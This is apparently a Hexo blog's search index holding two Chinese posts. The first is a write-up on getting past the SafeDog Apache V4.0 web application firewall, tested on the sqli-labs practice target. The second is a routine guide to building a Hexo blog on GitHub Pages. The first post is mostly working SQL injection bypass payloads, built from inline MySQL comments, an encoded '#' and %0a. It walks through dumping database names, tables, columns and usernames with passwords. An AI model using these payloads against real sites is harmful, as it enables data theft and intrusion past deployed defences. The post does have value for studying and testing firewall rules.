<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网站安全狗APACHE版V4.0绕过</title>
      <link href="/2023/04/29/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E7%8B%97APACHE%E7%89%88V4-0%E7%BB%95%E8%BF%87/"/>
      <url>/2023/04/29/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8%E7%8B%97APACHE%E7%89%88V4-0%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在记忆里上次绕安全狗还是在上次，开开心心把自己之前绕过狗的payload拿出来，发现全部被拦截了，事情一下子就严肃起来了，这就开整。<img src="/assets/image-20220210101102-k2p13gt.png" alt="image.png"></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本次环境如下sqli-lab的sql注入靶场</span><br><span class="line">网站安全狗APACHE版V4.0版本的最高防护等级</span><br></pre></td></tr></table></figure><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><p>首先先来分析分析以前以前绕过的Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union/*!10440*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p>其中这里的10440数字经过fuzz可以替换的有如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10440–10449 13440-13449 14400-14499 15440-15449 16440-16449 17440-17449 18440-18449 等等</span><br></pre></td></tr></table></figure><p>但是在更新后的安全狗后这些payload已经全部被拦截</p><p><img src="/assets/image-20220210112947-p973ryj.png" alt="image.png"></p><p>到这就不得不提提安全狗之前的匹配规则了，我们单独union不会被拦截</p><p><img src="/assets/image-20220210102704-nrcpsi2.png" alt="image.png"></p><p>单独select也不会被拦截</p><p><img src="/assets/image-20220210102744-tm2k93h.png" alt="image.png"></p><p>但是union和select放一起组合就会被匹配出来，然后被安全狗所拦截</p><p><img src="/assets/image-20220210102844-j4t2eo1.png" alt="image.png"></p><p>基于这个特性，我们利用之前的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union/*!10440*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p>是可以绕过老版本的安全狗的，这里在union和select中间加入了一个&#x2F;*!10440*&#x2F;，众所周知在mysql中&#x2F;*!…*&#x2F;不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在&#x2F;*!…*&#x2F;中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。</p><p>所以union&#x2F;*!10440*&#x2F;select等价于union select,且绕过了安全狗对union和select字符一起组合的检测</p><p><img src="/assets/image-20220210113247-o80q334.png" alt="image.png"></p><p><img src="/assets/image-20220210113309-8ovvx1n.png" alt="image.png"></p><p>但是安全狗更新之后，所有的payload都已经失效，那么我们猜测一下，安全狗更新后是不是匹配union和select之间所有的字符，匹配到之后用空字符替换，再检测是否存在union select组合，为了验证这个猜测我们对我们的payload进行fuzz验证一下</p><p>跑了一些特殊的字符发现都被拦截<img src="/assets/image-20220210104653-4fuct55.png" alt="image.png"></p><p>但是唯独有一个符号没有被返回的length长度不一样</p><p><img src="/assets/image-20220210105306-j317gqe.png" alt="image.png"></p><p>按我们看看这个’#’会擦出什么爱情的火花</p><p>我们利用如下语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union/*!test01#test02*/select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210105529-1seiqqq.png" alt="image.png"></p><p>此处我们搞清楚一个流程，我们的语句发送过去，首先接收安全狗检测，安全狗检测到’#’号，所以’#‘后面的都会被截断抛弃，所以安全狗只能匹配到’#‘前的union，但是没匹配到’#‘后的select，所以通过安全狗。在通过安全狗后我们的语句被数据库接收，数据库此处处理过程和安全狗处理流程一样，都是只能匹配到’#‘前的union，但是没匹配到’#‘后的select，最终导致语句不完整导致最后的报错。</p><p>说到这里我们究竟要怎么去绕过这个可恶的安全狗呢，我们想象这么一个场景，首先我们的’#‘被安全狗识别，但是在我们的SQL语句中并不识别这个’#‘，这样我们就可以达到绕过安全狗而且保持正确的SQL语句来实现我么的注入。</p><p>我们来看下下面两语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM number WHERE home_id =1 LIKE &quot;[%23]&quot;;</span><br><span class="line">SELECT * FROM number WHERE home_id =1 LIKE &quot;[%23]&quot; union select * FROM number;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210111606-4sc540e.png" alt="image.png"></p><p><img src="/assets/image-20220210111634-q48r6c9.png" alt="image.png"></p><p>此处SELECT * FROM number WHERE home_id &#x3D;1 LIKE “[%23]”;查出来一个空表</p><p>所以SELECT * FROM number WHERE home_id &#x3D;1 LIKE “[%23]” union select * FROM number;相当于select * FROM number；</p><p>该语句是存在一个LIKE “[%23]”，也正是这个LIKE “[%23]”让我们的SELECT * FROM number WHERE home_id &#x3D;1成为一个空表。</p><p><img src="/assets/image-20220210111930-hwjeqmo.png" alt="image.png"></p><p><img src="/assets/image-20220210112007-qm4enya.png" alt="image.png"></p><p>那么这个语句有什么用的，可以发现我们的LIKE “[%23]”中有一个%23，众所周知#的url编码是%23，那么这条语句带入到安全狗中，安全狗会不会识别这个#呢，带着这样的猜想我们构造如下payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union select*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210113656-jmvg52w.png" alt="image.png"></p><p>呜呜呜，还是被拦截了，吹牛逼吹了这么久，白吹了。</p><p>但是我这种阳光、帅气、善解人意且坚持不懈的小伙子会这么容易就放弃吗，显然不会，后面猜测是&#x2F;*!10440union select*&#x2F;中的union select被检测出来了，所以在union select中间下了点功夫，最终payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210114600-drzjavp.png" alt="image.png"></p><p>奈何无文化，一句卧槽走天下。</p><p>最后总结下安全狗的检测机制</p><p>首先整体语句做一个检测，这个检测也是最强最牛X的</p><p>‘#‘后的语句虽然被截断，但截断之后并不是和我们最初想的那样完全不检测，’#‘截断的语句还是会被检测，只是检测规则相比第一次不同且相比第一次检测强度相比较弱，所以我们可以对其进行绕过。</p><p>当然除了like关键字，我们还可以使用如下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; and &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; or &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; regexp &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br><span class="line">-1&#x27; /*%23*/ /*!10440union%0aselect*/ 1,2,3 --+</span><br></pre></td></tr></table></figure><p>知道了这个特性接下来就，那就用这一招打过天下无敌手</p><p>爆数据库名和用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),user(/*!10440%0a*/)--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220210150144-zx3u2iv.png" alt="image.png"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(table_name) from/*%23*/information_schema.tables where table_schema=database(/*!10440%0a*/)--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211094933-cz39a4b.png" alt="image.png"></p><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(column_name) from/*%23*/information_schema.columns where table_schema=database(/*!10440%0a*/) /*!10440and*/ table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211101324-3d9lcrx.png" alt="image.png"></p><p>爆字段中的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,database(/*!10440%0a*/),group_concat(username,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20220211101528-yxoqchw.png" alt="image.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1、内联yyds</p><p>2、在一些被拦截的地方多用&#x2F;*%23*&#x2F;和&#x2F;*!<em>10440%0a</em>*&#x2F;，有奇效。</p>]]></content>
      
      
      <categories>
          
          <category> Waf绕过小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/2023/04/29/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/04/29/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="仓库准备"><a href="#仓库准备" class="headerlink" title="仓库准备"></a>仓库准备</h1><p>创建一个github仓库</p><p><img src="/assets/image-20230428113657-foci2pj.png" alt="image.png"></p><p>名字格式如下</p><p><img src="/assets/image-20230428143514-5re00dt.png" alt="image.png"></p><p>创建完成</p><p><img src="/assets/image-20230428143531-7pssyed.png" alt="image.png"></p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>可百度自行寻找安装方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装npm</span><br><span class="line">安装git</span><br></pre></td></tr></table></figure><p>安装完成后确保能使用如下命令</p><p><img src="/assets/image-20230428114119-smyr1cd.png" alt="image.png"></p><p><img src="/assets/image-20230428114134-7i475dw.png" alt="image.png"></p><h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><p>创建一个目录，名字任意，然后打开git bash</p><p><img src="/assets/image-20230428114242-4sciiw9.png" alt="image.png"></p><p>使用git init初始化目录</p><p><img src="/assets/image-20230428114340-l6u5g0u.png" alt="image.png"></p><p>在git根目录下创建一个Blog目录，打开cmd窗口用如下命令安装hexo-cli</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>然后在Blog目录下使用如下命令完成hexo初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428114827-anozuyy.png" alt="image.png"></p><p>初始化后的文件结构</p><p><img src="/assets/image-20230428114845-kg8ru0e.png" alt="image.png"></p><p>使用如下命令启动博客</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428115010-qsc09n5.png" alt="image.png"></p><p>本地访问</p><p><img src="/assets/image-20230428115023-d7gxtc1.png" alt="image.png"></p><h1 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h1><p>Hexo默认的主体比较简约，屏幕使用占比不是很高，用户可以根据自己的喜好自定义Hexo主体，这里以butterfly主题为例</p><p>在Hexo的根目录执行如下命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https:<span class="comment">//github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428133950-mcf3uwk.png" alt="image.png"></p><p>在&#x2F;Blog&#x2F;themes下会克隆一个文件夹下来</p><p><img src="/assets/image-20230428134131-7qkc7yq.png" alt="image.png"></p><p>然后在Hexo的根目录下修改_config.yml文件里的theme为butterfly</p><p><img src="/assets/image-20230428134342-4oab1oq.png" alt="image.png"></p><p>修改后在安装一下 pug 和 stylus 的渲染器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428134521-73agchw.png" alt="image.png"></p><p>重新启动查看效果</p><p><img src="/assets/image-20230428134620-sc08gi3.png" alt="image.png"></p><h1 id="上传Github"><a href="#上传Github" class="headerlink" title="上传Github"></a>上传Github</h1><p>本地搭建没有问题之后，就可以把博客部署到Github仓库里去了</p><p>复制我们之前创建好的仓库的地址</p><p><img src="/assets/image-20230428143709-6100690.png" alt="image.png"></p><p>然后在Hexo的根目录下的_config.yml进行如下配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  repository: https:<span class="comment">//github.com/suifeng-kali/suifeng-kali.github.io.git</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428143638-vwbi1d9.png" alt="image.png"></p><p>配置好后可以下载一个deploy-git，利用deploy-git简化部署步骤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428140134-k25rrrp.png" alt="image.png"></p><p>然后使用如下命令进行部署</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230428214432-1ecgmg6.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
